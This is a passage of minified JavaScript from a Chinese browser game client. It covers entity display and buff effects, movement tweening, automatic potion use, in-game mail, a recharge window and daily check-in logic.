e,i=this;if(this.infoModel.type==EntityType.CollectionMonst&&A.GameMap.checkIsInKf3v3())return 2==k.KfArenaSys.ins().collectStatus?void b.TipsCT.ins().showTips(gettext("正在采集中")):(k.KfArenaSys.ins().collectStatus=1,v.ControlCC.isAuto&&(v.ControlCC.setAuto(!1),v.ControlCC.setCurTar(null)),B.GameLogic.ins().postRemoveMapArrow(),void v.ControlCC.pushCommand(v.CommandEnum.move,{gridX:p.mainfightcc.xToGrid(this.x),gridY:p.mainfightcc.yToGrid(this.y),checkFun:function(){if(!m.SubRoles.lookAtTar)return!0;var t=v.ControlCC.getDis(m.SubRoles.lookAtTar.data,{gridX:p.mainfightcc.xToGrid(i.x),gridY:p.mainfightcc.yToGrid(i.y)});return 1>=t&&1==k.KfArenaSys.ins().collectStatus&&(console.log("---移动到了采集怪附近---"),k.KfArenaSys.ins().collectOwnerHandle>0?(b.TipsCT.ins().showTips(gettext("已经有人正在采集了")),v.ControlCC.setAuto(!0),k.KfArenaSys.ins().collectStatus=0):k.KfArenaSys.ins().collectStatus=2),v.ControlCC.getDis(m.SubRoles.lookAtTar.data,{gridX:p.mainfightcc.xToGrid(i.x),gridY:p.mainfightcc.yToGrid(i.y)})<=1}}));if(this.infoModel.type==EntityType.CollectionMonst&&A.GameMap.checkIsInDominate())return 2==P.DominateWorldCT.ins().collectStatus?void b.TipsCT.ins().showTips(gettext("正在采集中")):(P.DominateWorldCT.ins().collectStatus=1,v.ControlCC.isAuto&&(v.ControlCC.setAuto(!1),v.ControlCC.setCurTar(null)),B.GameLogic.ins().postRemoveMapArrow(),void v.ControlCC.pushCommand(v.CommandEnum.move,{gridX:p.mainfightcc.xToGrid(this.x),gridY:p.mainfightcc.yToGrid(this.y),checkFun:function(){if(!m.SubRoles.lookAtTar)return!0;var t=v.ControlCC.getDis(m.SubRoles.lookAtTar.data,{gridX:p.mainfightcc.xToGrid(i.x),gridY:p.mainfightcc.yToGrid(i.y)});return 1>=t&&1==P.DominateWorldCT.ins().collectStatus&&(console.log("---移动到了采集怪附近---"),P.DominateWorldCT.ins().collectOwnerHandle>1?(b.TipsCT.ins().showTips(gettext("采集失败")),v.ControlCC.setAuto(!0),P.DominateWorldCT.ins().collectStatus=0):(P.DominateWorldCT.ins().collectSwordHandles=i.data.handle,P.DominateWorldCT.ins().collectStatus=2)),v.ControlCC.getDis(m.SubRoles.lookAtTar.data,{gridX:p.mainfightcc.xToGrid(i.x),gridY:p.mainfightcc.yToGrid(i.y)})<=1}}));if(!A.GameMap.checkIsInShiKongZhiJing()||(null===(e=l.GlobalConfig.InstanceConfig[A.GameMap.fubenID])||void 0===e?void 0:e.camp)!=T.CampMode.PWACE){var n=l.GlobalConfig.MonstersConfig[this.infoModel.configID];if(!n||n.type!=g.MonsterType.Ring){var o=this.data.isFriend();return o&&!this.data.isMy?void b.TipsCT.ins().showTips(gettext("不能攻击友方成员")):void(this.isDie()||(v.ControlCC.setAuto(!1),v.ControlCC.setCurTar(this),v.ControlCC.setAuto(!0),this.data&&this.data.handle&&B.GameLogic.ins().postAttrEntityPoint(this.data.handle)))}}},e.prototype.init=function(t){this.data=t},e.prototype.createModel=function(){this.updateModel()},e.prototype.playAction=function(t,e){(t!=this.action||-1!=this.playCount())&&(this.action=t,this.cb=e,this.updateModel())},Object.defineProperty(e.prototype,"dir",{get:function(){return this._dir},set:function(t){this._dir!=t&&(this._dir=t,this.updateModel())},enumerable:!1,configurable:!0}),e.prototype.updateModel=function(){if(this.data)switch(this.action){case s.EntityAction.DIE:if(this.data.isMy||this.dieMc.parent)return;this.data.configID?this.data.isMy?this.alpha=1:this.alpha=0:this.alpha=1;var t=l.GlobalConfig.MonstersConfig[this.data.configID];if((null===t||void 0===t?void 0:t.type)==g.MonsterType.MonsterType_Fire)return void this.removeTouchEvent(this,this.onClick);this.parent&&this.parent.addChild(this.dieMc);var e=t?t.size||1:1;this.dieMc.x=this.x+this.width*e/2,this.dieMc.y=this.y+this.height*e/2,this.dieMc.playFile(RES_DIR_EFF+"die"),(null===t||void 0===t?void 0:t.sound)&&f.SoundUtil.play(t.sound)}},e.prototype.createBossEff=function(){var t;this.data.configID&&(null===(t=l.GlobalConfig.MonstersConfig[this.data.configID])||void 0===t?void 0:t.type)==g.MonsterType.Boss&&(this.bossEff||(this.bossEff=new n.MovieClip,this.bossEff.touchEnabled=!1,this.bossEffGrp.addChild(this.bossEff)),this.bossEff.playFile(RES_DIR_EFF+"BossFrame",-1))},e.prototype.updataCampInfo=function(){this.data.isFriend()&&!this.data.isMy&&(this.enemyMc&&this.enemyEff.removeChild(this.enemyMc),this.enemyMc=null)},e.prototype.createEnemyEff=function(){return this.isCanPlayEnemyEff()?(this.enemyMc||(this.enemyMc=new n.MovieClip,this.enemyMc.touchEnabled=!1,this.enemyEff.addChild(this.enemyMc)),void this.enemyMc.playFile(RES_DIR_EFF+"enemyEff",-1)):(this.enemyMc&&this.enemyEff.removeChild(this.enemyMc),void(this.enemyMc=null))},e.prototype.isCanPlayEnemyEff=function(){if(this.data.type!=EntityType.Role)return!1;if(this.data.isMy)return!1;if(this.data.isFriend())return!1;var t=this.data.getCampModel();switch(t){case T.CampMode.TEAM:return!I.CityCC.ins().isMyTeamNumber(this.infoModel?this.infoModel.teamId:0);case T.CampMode.GUILD:var e=this.infoModel.guildID;return e&&e!=w.Guild.ins().guildID;case T.CampMode.ALL:return!0;case T.CampMode.PWACE:return!1;default:return!1}},e.prototype.createTeamRoleEff=function(){return this.data.isMy?(this.teamMc||(this.teamMc=new n.MovieClip,this.teamMc.touchEnabled=!1,this.teamGrp.addChild(this.teamMc)),void this.teamMc.playFile(RES_DIR_EFF+"teamfbEff",-1)):void(this.teamMc&&this.teamGrp.removeChild(this.teamMc))},e.prototype.playCount=function(){return this.action==s.EntityAction.RUN||this.action==s.EntityAction.STAND?-1:1},e.prototype.updateBlood=function(){this.eHp&&(this.eHp.scaleX=Math.min(this.data.hp/(this.data.hp_max||1),1),this.perHp.text=Math.min(this.data.hp,this.data.hp_max)+" /"+this.data.hp_max)},e.prototype.updateNeiGong=function(){this.eMp&&(this.eMp.scaleX=Math.min(this.data.mp/(this.data.mp_max||1),1),this.perMp.text=Math.min(this.data.mp,this.data.mp_max)+" /"+this.data.mp_max)},e.prototype.$setX=function(e){return t.prototype.$setX.call(this,e)},e.prototype.$setY=function(e){return this.zIndex=e+.1*this.x,t.prototype.$setY.call(this,e)},e.prototype.updateName=function(){var t=this.data,e=t.name,i=(t.type,t.nameColor),n=e;if(this.data.type==EntityType.Pet){var o=x.EntityManager.ins().getEntityByHandle(this.data.masterHandle);o&&(n=gettext("<font color='#{1}'>{0}"+gettext("的")+"</font>\n{2}",o.data.name,c.ColorConst.EntityColor[0].toString(16),n))}~n.indexOf("<")?this.eNameLab.textFlow=HtmlUtil.parse(n):this.eNameLab.text=n,this.eNameLab.textColor=i||c.ColorConst.EntityColor[0]},e.prototype.updateBg=function(){var t,e,i;this.bgkuang.source=this.data.GetQuality?"monster"+this.data.GetQuality:"";var n="entity_bg";if(this.data.isMy?n=m.SubRoles.ins().getSubRoleByIndex(0).outward?(null===(t=l.GlobalConfig.TitleConf[m.SubRoles.ins().getSubRoleByIndex(0).outward])||void 0===t?void 0:t.img)+"_png"||!1:"entity_bg":this.data.outward&&(n=this.data.outward?(null===(e=l.GlobalConfig.TitleConf[this.data.outward])||void 0===e?void 0:e.img)+"_png"||!1:"entity_bg"),this.data.configID){var o=l.GlobalConfig.MonstersConfig;o&&(null===(i=o[this.data.configID])||void 0===i?void 0:i.bgimg)&&(n=o[this.data.configID].bgimg)}this.bg.source=n},e.prototype.updatePetImg=function(){this.petImg.visible=this.data.isPet(),this.petImg.visible&&(this.lb_lv.text="")},e.prototype.updataStateImg=function(t,e){var i,n=null===(i=l.GlobalConfig.EffectsConfig[e])||void 0===i?void 0:i.effIcon,o=l.GlobalConfig.GemReviseEffConfig[e];if(this.hasSuitEffByEffId(e)&&(n=o.effID),n){for(var s=0;s<this.stateGrp.numElements;s++){var a=this.stateGrp.getElementAt(s);if(a&&a.source==n){if(t)return;return void this.stateGrp.removeChildAt(s)}}if(t){var r=new eui.Image;r.width=r.height=20,r.source=n,this.stateGrp.addChild(r)}}},e.prototype.updateFire=function(t){var e,i=this;if((null===(e=this.data)||void 0===e?!0:!e.isMy)&&this.skin){var o=l.GlobalConfig.MonstersConfig[this.data.configID],s=(null===o||void 0===o?void 0:o.type)==g.MonsterType.MonsterType_Fire;if(this.touchEnabled=!1,this.grp.touchEnabled=!1,this.grp.touchChildren=!1,this.touchRect.touchEnabled=s?!1:!0,s&&this.removeTouchEvent(this,this.onClick),this.group.visible=s?!1:!0,s||(null===o||void 0===o?void 0:o.avatar)){if(this.eIcon.source="",this.bodyMc||(this.bodyMc=new n.MovieClip,this.bodyMc.touchEnabled=!1),!this.bodyMc.isPlaying){var a=s?RES_DIR_SKILLEFF+(""+o.avatar):RES_DIR_MONSTER+(o.avatar+"_s");this.bodyMc.playFile(a,-1,null,!1)}t&&this.bodyMc.playFile(RES_DIR_MONSTER+(o.avatar+"_a"),1,function(){i.bodyMc.playFile(RES_DIR_MONSTER+(o.avatar+"_s"),-1,null,!1)},!1),this.bodyMc.scaleX=this.bodyMc.scaleY=o.gsize||1,this.bossBodyGrp.addChild(this.bodyMc)}}},e.prototype.getGrid=function(){var t=Math.floor(this.x/p.mainfightcc.gridW),e=Math.floor(this.y/p.mainfightcc.gridH);return{x:t,y:e}},e.prototype.addEff=function(t){var e="res/status/"+t;this.effTopGroup.getChildByName(e)||this.effTopGroup.addChild(n.MovieClip.create(e,-1))},e.prototype.removeEff=function(t){removeFromParent(this.effTopGroup.getChildByName("res/status/"+t))},e.prototype.isDie=function(){return!this.data||this.data.hp<=0},e.prototype.dealBuff=function(t,e){return this.skinInit?(this.setBuff(t,e),this.updataStateImg(t,e),this.setFilter(),void this.setEntityStatus(t,e)):void this.waitInit.push(arguments)},e.prototype.setBuff=function(t,e){var i=l.GlobalConfig.EffectsConfig[e];if(!i)return void console.error("EffectsConfig不存在,id=",e);for(var o=l.GlobalConfig.EffectConfig[i.effID],s=!1,a=0;a<this.fashiEffValue.length;a++)e==this.fashiEffValue[a]&&(s=!0);if(t){if(s&&this.effCount++,-1==this.buffIDs.indexOf(e)&&this.buffIDs.push(e),i.effID){if(!o)return void console.error("EffectConfig不存在,effID=",i.effID);var r=this;if(0==o.type){var u=this.effImg[e];u?egret.Tween.removeTweens(u):(u=new eui.Image(o.fileName),this.addChild(u),this.effImg[e]=u),u.x=-23,u.y=0,egret.Tween.get(u).to({y:-100},2e3).call(function(){h.DisplayUtils.removeFromParent(u),delete r.effImg[e]})}else if(1==o.type){var p=this.effs[e];p||(p=new n.MovieClip,p.touchEnabled=!1,this.effGrp.addChild(p),this.effs[e]=p),p.playFile(RES_DIR_EFF+o.fileName,1,function(){delete r.effs[e]})}}else if(i.effName){if(this.effs[e]){if(!s)return;var p=this.effs[e];p&&(h.DisplayUtils.removeFromParent(p),delete this.effs[e])}var d=i.effName,c=l.GlobalConfig.GemReviseEffConfig[i.group];if(c&&this.data.suitData&&this.data.suitData.length)for(var a=0;a<this.data.suitData.length;a++){var f=this.data.suitData[a];if(-1!=c.revises.indexOf(f)){var g=l.GlobalConfig.GemReviseConfig[this.data.suitData[0]];if(g){d=l.GlobalConfig.GemReviseEffConfig[i.group].effName;break}}}var p=new n.MovieClip;this.effs[e]=p,p.x=-this.width/2+(i.effDis&&i.effDis.x?i.effDis.x:0),p.y=-this.height/2+(i.effDis&&i.effDis.y?i.effDis.y:0),s&&(d=this.fashiEffArrs[this.effCount-1]+""),p.stop(),p.playFile(RES_DIR_SKILLEFF+d,-1),p.touchEnabled=!1,this.effGrp.addChild(p)}}else{var m=this.buffIDs.indexOf(e);if(-1!=m)if(s?this.effCount<=0&&this.buffIDs.splice(m,1):this.buffIDs.splice(m,1),i.effID){if(!o)return void console.error("EffectConfig不存在,effID=",i.effID);if(0==o.type){var u=this.effImg[e];u&&(egret.Tween.removeTweens(u),h.DisplayUtils.removeFromParent(u),delete this.effImg[e])}else if(1==o.type){var p=this.effs[e];p&&(h.DisplayUtils.removeFromParent(p),delete this.effs[e])}}else if(i.effName){if(s&&this.effCount>0){this.effCount--;var d=this.fashiEffArrs[this.effCount-1];if(this.effCount<=0&&(this.effCount=0),d&&void 0!=d&&this.effs[e].playFile(RES_DIR_SKILLEFF+d,-1),this.effCount>0)return}var p=this.effs[e];p&&(h.DisplayUtils.removeFromParent(p),delete this.effs[e])}}},e.prototype.hasSuitEffByEffId=function(t){var e=l.GlobalConfig.GemReviseEffConfig[t];if(e&&this.data.suitData&&this.data.suitData.length)for(var i=0;i<this.data.suitData.length;i++){var n=this.data.suitData[i];if(-1!=e.revises.indexOf(n)){var o=l.GlobalConfig.GemReviseConfig[this.data.suitData[0]];if(o&&e.effID)return!0}}return!1},e.prototype.removeAllEff=function(){this.buffIDs.length=0,this.effCount=0;for(var t in this.effs)h.DisplayUtils.removeFromParent(this.effs[t]),delete this.effs[t];for(var e in this.effImg){var i=this.effImg[e];egret.Tween.removeTweens(i),h.DisplayUtils.removeFromParent(i),delete this.effImg[e]}this.bg&&this.bg.filters&&(this.bg.filters=null)},e.prototype.setFilter=function(){for(var t=[],e=0,i=this.buffIDs;e<i.length;e++){var n=i[e],o=l.GlobalConfig.EffectsConfig[n];if(o){var s=l.GlobalConfig.EffectConfig[o.effID];s&&1==s.id&&t.push(_.FilterUtil.grayFilter1)}}this.bg.filters=t},e.prototype.setEntityStatus=function(t,e){var i=l.GlobalConfig.EffectsConfig;if(i[e]){var n=i[e].type;if(n)switch(n){case D.SkillEffectType.SkillEffectType_Status:var o=i[e].args;if(o){var s=o.i;this.setEntityStatusData(t,s)}}}},e.prototype.setEntityStatusData=function(t,e){switch(e){case D.StatusType.StatusType_Stealth:this.data.isStealth=t,this.data.isMy?t?this.bg.visible=!1:this.bg.visible=!0:t?this.alpha=.3:this.alpha=1}},e.prototype.updateLv=function(){if(this.data.type==EntityType.Role)this.lb_lv.text=this.data.lv+"";else{var t=l.GlobalConfig.MonstersConfig[this.data.configID];t&&(this.lb_lv.text=t.level+"")}},e.prototype.updateFace=function(){if(this.eIcon.source="",this.data.isMy)this.eIcon.source="yuanhead"+this.data.job+this.data.sex;else if(this.data.job&&!l.GlobalConfig.MonstersConfig[this.data.configID])this.eIcon.source="yuanhead"+this.data.job+this.data.sex;else{var t=l.GlobalConfig.MonstersConfig[this.data.configID];t&&t.head&&(this.eIcon.source="monhead"+t.head+"_png")}},e.prototype.updateTitle=function(){var t=this.data.isMy?m.SubRoles.ins().getSubRoleByIndex(0).titleID:0,e=t||parseInt(this.data.titleID);if("0"==e&&(e=0),this.eTitleGrp.visible=!!e,this.effTopGrp.visible=!1,this.eTitleGrp.visible){var i=l.GlobalConfig.TitleConf[e];this.eTitle.text=(null===i||void 0===i?void 0:i.name)||"",this.eTitle.textColor=C.ItemUtil.getQualityColor((null===i||void 0===i?void 0:i.rare)||0),this.updateTitleEff(i)}},e.prototype.updateTitleEff=function(t){return(null===t||void 0===t?void 0:t.eff)?(this.titleMc||(this.titleMc=ObjectPool.pop("MovieClip"),this.effTopGrp.addChild(this.titleMc)),this.eTitle.visible=!1,this.effTopGrp.visible=!0,void this.titleMc.playFile(RES_DIR_EFF+(null===t||void 0===t?void 0:t.eff),-1)):(this.titleMc&&this.effTopGrp.removeChild(this.titleMc),this.titleMc=null,this.effTopGrp.visible=!1,void(this.eTitle.visible=!0))},e.prototype.updateWingEff=function(){if(v.ControlCC.isHideWingEff)return this.wingMc&&this.wingEffGrp.removeChild(this.wingMc),this.wingMc=null,void(this.wingEffGrp.visible=!1);var t=this.data.isMy?m.SubRoles.ins().getSubRoleByIndex(0).wingID:null,e=t||this.data.wingID;if(!e)return this.wingMc&&this.wingEffGrp.removeChild(this.wingMc),this.wingMc=null,void(this.wingEffGrp.visible=!1);this.wingMc||(this.wingMc=ObjectPool.pop("MovieClip"),this.wingEffGrp.addChild(this.wingMc),this.wingEffGrp.visible=!0),this.wingMc.playFile(RES_DIR_EFF+e,-1);var i;for(var n in l.GlobalConfig.WingLevelConfig){var o=l.GlobalConfig.WingLevelConfig[n];if(o.appearance==e){i=o;break}}i&&i.size1?this.wingMc.scaleX=this.wingMc.scaleY=i.size1:this.wingMc.scaleX=this.wingMc.scaleY=1,i&&i.pos1?(this.wingMc.x=i.pos1.x,this.wingMc.y=i.pos1.y):(this.wingMc.x=0,this.wingMc.y=0)},e.prototype.updateDemonCirEff=function(){if(v.ControlCC.isHideWingEff)return this.demonCirMc&&this.demonCirEffGrp.removeChild(this.demonCirMc),this.demonCirMc=null,void(this.demonCirEffGrp.visible=!1);var t=this.data.isMy?m.SubRoles.ins().getSubRoleByIndex(0).demonCirID:0,e=t||this.data.demonCirID;if(!e)return this.demonCirMc&&this.demonCirEffGrp.removeChild(this.demonCirMc),this.demonCirMc=null,void(this.demonCirEffGrp.visible=!1);var i=l.GlobalConfig.DemonCirBase[e];this.demonCirMc||(this.demonCirMc=ObjectPool.pop("MovieClip"),this.demonCirEffGrp.addChild(this.demonCirMc),this.demonCirEffGrp.visible=!0),this.demonCirMc.playFile(RES_DIR_EFF+i.footEff,-1)},e.prototype.updateLongGasCirEff=function(){if(v.ControlCC.isHideWingEff)return this.longGasMc&&this.longGasEffGrp.removeChild(this.longGasMc),this.longGasMc=null,void(this.longGasEffGrp.visible=!1);var t=this.data.isMy?m.SubRoles.ins().getSubRoleByIndex(0).longGasID:0,e=t||this.data.longGasID;if(!e)return this.longGasMc&&this.longGasEffGrp.removeChild(this.longGasMc),this.longGasMc=null,void(this.longGasEffGrp.visible=!1);var i=l.GlobalConfig.LoongGasCfg[e];this.longGasMc||(this.longGasMc=ObjectPool.pop("MovieClip"),this.longGasEffGrp.addChild(this.longGasMc),this.longGasEffGrp.visible=!0),this.longGasMc.scaleX=this.longGasMc.scaleY=i.size2?i.size2:1,this.longGasMc.x=i.pos2?i.pos2[0]:0,this.longGasMc.y=i.pos2?i.pos2[1]:0,this.longGasMc.playFile(RES_DIR_EFF+i.outside,-1)},e.prototype.updateGodCrownCirEff=function(){if(v.ControlCC.isHideWingEff)return this.godCrownMc&&this.crowneff.removeChild(this.godCrownMc),this.godCrownMc=null,void(this.crowneff.visible=!1);var t=this.data.isMy?m.SubRoles.ins().getSubRoleByIndex(0).godCrownID:0,e=t||this.data.godCrownID;if(!e)return this.godCrownMc&&this.crowneff.removeChild(this.godCrownMc),this.godCrownMc=null,void(this.crowneff.visible=!1);var i=l.GlobalConfig.CrownCfg[e];this.godCrownMc||(this.godCrownMc=ObjectPool.pop("MovieClip"),this.crowneff.addChild(this.godCrownMc),this.crowneff.visible=!0),this.godCrownMc.scaleX=this.godCrownMc.scaleY=i.size2?i.size2:1,this.godCrownMc.playFile(RES_DIR_EFF+i.appearance,-1)},e.prototype.updateTarShow=function(){v.ControlCC.curTar?this.selectImg.visible=v.ControlCC.curTar.hashCode==this.hashCode:this.selectImg.visible=!1},e.prototype.entityOffX=function(){var t,e=l.GlobalConfig.MonstersConfig[(null===(t=this.data)||void 0===t?void 0:t.configID)||0],i=(null===e||void 0===e?void 0:e.size)?e.size:1;return.5*this.width*i},e.prototype.entityOffY=function(){var t,e=l.GlobalConfig.MonstersConfig[(null===(t=this.data)||void 0===t?void 0:t.configID)||0],i=(null===e||void 0===e?void 0:e.size)?e.size:1;return.5*this.height*i},e.prototype.haveBuff=function(t){for(var e=0,i=this.buffIDs;e<i.length;e++){var n=i[e];if(l.GlobalConfig.EffectsConfig[n].group==t)return!0}return!1};var i;return e.pool=[],__decorate([delayCall()],e.prototype,"updateModel",null),e=i=__decorate([r.mainRoleSyncCamera(),r.nameColorLogic()],e)}(u.BaseView);e.Entity=R,window.Entity=R,__reflect(R.prototype,"Entity",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0});var n=i(34),o=function(){function t(){}return t.startSpeed=function(t,e,i){var n=t.x-e.x,o=t.y-e.y,s=Math.sqrt(Math.pow(n,2)+Math.pow(o,2));return this.startTime(t,e,s/i*1e3)},t.startGridSpeed=function(t,e){var i=t.getGrid(),o=Math.floor(e.x/64),s=Math.floor(e.y/64),a=Math.max(Math.abs(i.x-o),Math.abs(i.y-s));return this.startTime(t,e,a*t.infoModel.getAtt(n.AttributeType.atMoveSpeed))},t.startTime=function(e,i,n){return new Promise(function(o){var s=e[t.flag]=e[t.flag]||{set x(t){e.x=t},set y(t){e.y=t},get x(){return e.x},get y(){return e.y}};s._comPara&&urlParam.debugTS&&(console.error("@@重复缓动tar=",e),console.groupCollapsed(),console.trace(),console.groupEnd()),s._comPara={func:o,target:i},egret.Tween.get(s,null,null,!0).to(i,n).call(function(){delete s._comPara,o(1)})})},t.stop=function(e,i){void 0===i&&(i=!1);var n=e[t.flag];if(n&&(egret.Tween.removeTweens(n),n._comPara)){var o=n._comPara;return delete n._comPara,i&&(n.x=o.target.x,n.y=o.target.y),o.func(0),!0}return!1},t.pause=function(e){e[t.flag]&&egret.Tween.pauseTweens(e[t.flag])},t.resume=function(e){e[t.flag]&&egret.Tween.resumeTweens(e[t.flag])},t.moveing=function(e){var i=e[t.flag];return i?i.tween_count:0},t.flag="_$mover_",t}();e["default"]=o,window.Mover=o,__reflect(o.prototype,"Mover",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.MainPotCC=e.mainPotCC=void 0;var n=i(101),o=i(13),s=i(20),a=i(6),r=i(32),l=i(112),h=function(t){function e(){var e=t.call(this)||this;return e.Min=5,e.Max=95,e.OFF=5,e.Dv=50,e._isTimeOpen=!1,e}return __extends(e,t),e.prototype.eatEatEatTime=function(){Timer.has(this.eatEatEat,this)||Timer.start(1e3,0,this.eatEatEat,this)},e.prototype.eatEatEat=function(){if(s.GameMap.fbType!=r.FbCT.FB_PVP&&s.GameMap.fbType!=r.FbCT.FB_TYPE_PEAKED){var t=o.SubRoles.lookAtTar;if(t&&t.infoModel&&!t.isDie()){var e=t.infoModel,i=e.hp/e.hp_max,n=e.mp/e.mp_max;if(l.SysSetting.ins().getBool(l.SysSetting.HP)){var h=l.SysSetting.ins().getValue(l.SysSetting.HP_NUM)/100,u=l.SysSetting.ins().getValue(l.SysSetting.HP_ITEM),p=a.BagCT.ins().getBagGoodsCountById(a.BagCT.BAG_TYPE_OTHTER,u)||0;p>0&&a.BagCT.ins().isCoolDown(u)<=0&&h>=i&&a.BagCT.ins().sendUseItem(u,1)}if(l.SysSetting.ins().getBool(l.SysSetting.MP)){var h=l.SysSetting.ins().getValue(l.SysSetting.MP_NUM)/100,u=l.SysSetting.ins().getValue(l.SysSetting.MP_ITEM),p=a.BagCT.ins().getBagGoodsCountById(a.BagCT.BAG_TYPE_OTHTER,u)||0;p>0&&a.BagCT.ins().isCoolDown(u)<=0&&h>=n&&a.BagCT.ins().sendUseItem(u,1)}if(l.SysSetting.ins().getBool(l.SysSetting.SP)){var d=l.SysSetting.ins().getValue(l.SysSetting.SP_NUM)/100,c=l.SysSetting.ins().getValue(l.SysSetting.SP_ITEM),f=a.BagCT.ins().getBagGoodsCountById(a.BagCT.BAG_TYPE_OTHTER,c)||0;if(0>=f)return;if(a.BagCT.ins().isCoolDown(c)>0)return;(d>=i||d>=n)&&a.BagCT.ins().sendUseItem(c,1)}}}},e}(n.CC);e.mainPotCC=h,window.mainPotCC=h,__reflect(h.prototype,"mainPotCC",[]),e.MainPotCC=new h,window.MainPotCC=e.MainPotCC},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.MailCT=void 0;var n=i(14),o=i(400),s=i(55),a=i(17),r=i(13),l=function(t){function e(){var e=t.call(this)||this;return e.mailData=[],e.redMail=new a.RedPoint,e.sysId=PackageID.Mail,e.regNetMsg(1,e.doMailData),e.regNetMsg(2,e.doMailDetailedData),e.regNetMsg(3,e.doDeleteMail),e.regNetMsg(4,e.doGetItemMail),e.regNetMsg(5,e.doAddMail),e.regNetMsg(6,e.doMailDetailedDataEx),observe(e,e.initRed,r.SubRoles.ins().doSubRole),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.sendMailContentData=function(t){var e=this.getBytes(2);e.writeDouble(t),this.sendToServer(e)},e.prototype.sendGetItem=function(t){var e=this.getBytes(4);e.writeInt(t.length);for(var i=0;i<t.length;i++)e.writeDouble(t[i]);this.sendToServer(e)},e.prototype.doMailData=function(t){this.parser(t,1),this.postMailData()},e.prototype.postMailData=function(){},e.prototype.doMailDetailedData=function(t){var e=new o.MailData;e.parser(t);for(var i=0;i<this.mailData.length;i++)if(this.mailData[i].handle==e.handle){this.mailData[i]=e;break}this.postMailDetail(e)},e.prototype.doMailDetailedDataEx=function(t){var e=new o.MailData;e.parser(t);for(var i=0;i<this.mailData.length;i++)if(this.mailData[i].handle==e.handle){this.mailData[i]=e;break}this.postMailDetail(e)},e.prototype.postMailDetail=function(t){return t},e.prototype.doDeleteMail=function(t){this.deleteMailDataByHandle(t.readDouble()),this.postMailData()},e.prototype.doGetItemMail=function(t){this.setMailListData(t)},e.prototype.postGetItemFromMail=function(){},e.prototype.doAddMail=function(t){this.parser(t,0),this.postMailData()},e.prototype.parser=function(t,e){if(e){this.mailData=[];for(var i=t.readInt(),n=0;i>n;n++){var s=new o.MailData;s.disposeData(t),this.mailData.push(s)}this.mailData.sort(this.sortDesc)}else{var s=new o.MailData;s.disposeData(t),this.mailData.unshift(s)}},e.prototype.getMailDataByHandle=function(t){for(var e in this.mailData)if(this.mailData[e].handle==t)return[e,this.mailData[e]];return null},e.prototype.deleteMailDataByHandle=function(t){for(var e=0;e<this.mailData.length;e++)if(this.mailData[e].handle==t)return void this.mailData.splice(e,1)},e.prototype.getMailByReceive=function(t){void 0===t&&(t=0);for(var e=[],i=this.mailData.length-1;i>=0;i--)this.mailData[i].receive==t&&e.push(this.mailData[i]);return e},e.prototype.getMailByRead=function(){for(var t=this.mailData.length-1;t>=0;t--)if(0==this.mailData[t].type)return[t,this.mailData[t]];return this.mailData[0]?[0,this.mailData[0]]:null},e.prototype.getMailByReceiveAndRead=function(){for(var t=[],e=0;e<this.mailData.length;e++)(0==this.mailData[e].type||0==this.mailData[e].receive)&&t.push(this.mailData[e]);return t},e.prototype.getUnreadMail=function(){for(var t=0,e=this.mailData.length-1;e>=0;e--){var i=this.mailData[e];(0==i.type||0==i.receive)&&(t+=1)}return t},e.prototype.setMailListData=function(t){for(var e=t.readInt(),i=0;e>i;i++)for(var n=t.readDouble(),o=0,s=this.mailData;o<s.length;o++){var a=s[o];if(a.handle==n){a.type=t.readInt(),a.receive=t.readInt(),this.postMailDetail(a);break}}this.postGetItemFromMail()},e.prototype.sortDesc=function(t,e){var i=t.times,n=e.times;return s.Algorithm.sortDesc(i,n)},e.prototype.isTwinkle=function(){for(var t=0;t<this.mailData.length;t++){var e=this.mailData[t];if(0==e.type)return!0}return!1},e.prototype.initRed=function(){var t=this;this.redMail=new a.RedPoint(function(){return t.isTwinkle()},t.postMailData,t.postMailDetail,t.postGetItemFromMail)},__decorate([post()],e.prototype,"postMailData",null),__decorate([post()],e.prototype,"postMailDetail",null),__decorate([post()],e.prototype,"postGetItemFromMail",null),e}(n.BaseSystem);e.MailCT=l,window.MailCT=l,__reflect(l.prototype,"MailCT",[]),Systemap.MailCT=function(){return l.ins()},window.MailCT=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RechargeShowWin=void 0;var n=i(1),o=i(15),s=i(12),a=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.oneLevelWin=!0,e._sn_="RechargeShowWinSkin",e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.initTab();var i=t[0]?t[0]:0;this.eVs.selectedIndex=this.eTab.selectedIndex=i},e.prototype.initTab=function(){var t=this.eVs.getChildIndex(this.SVipPanel);t>=0&&!s.OpenSystem.ins().checkSysOpen(o.SystemType.SVip)&&this.eVs.removeChildAt(t)},e.openCheck=function(){return!window.platform.isshen()},e}(n.BaseView);e.RechargeShowWin=a,window.RechargeShowWin=a,__reflect(a.prototype,"RechargeShowWin",[]),window.RechargeShowWin=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DailyCheckInState=e.DailyCheckIn=void 0;var n=i(14),o=i(17),s=i(0),a=function(t){function e(){var e=t.call(this)||this;return e._loginTimes=0,e.conLoginTimes=0,e.todayReward=!1,e.sysId=PackageID.DailyCheckIn,e.regNetMsg(1,e.postCheckInData),e.initRps(),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},Object.defineProperty(e.prototype,"loginTimes",{get:function(){return this._loginTimes},enumerable:!1,configurable:!0}),e.prototype.postCheckInData=function(t){this._loginTimes=t.readShort(),this.todayReward=t.readBoolean(),this.conLoginTimes=t.readShort(),this.rewardIndex=t.readShort()},e.prototype.sendCheckIn=function(t){var e=this.getBytes(1);e.writeShort(t),this.sendToServer(e)},e.prototype.postCheckIn=function(t){return t},e.prototype.sendGetReward=function(t){var e=this.getBytes(3);e.writeInt(t),this.sendToServer(e)},e.prototype.postComplement=function(t){return t},e.prototype.showRedPoint=function(){var t=this.canNormalCheckIn();return t},e.prototype.initRps=function(){var t=this;this.rp=new o.RedPoint(function(){return t.canNormalCheckIn()},this.postCheckInData)},e.prototype.canNormalCheckIn=function(){return!this.todayReward},e.prototype.checkConReward=function(){var t=this.getRewardList(this.rewardIndex)?this.getRewardList(this.rewardIndex).days:0;return this.conLoginTimes>=t},e.prototype.getCheckInState=function(t){return 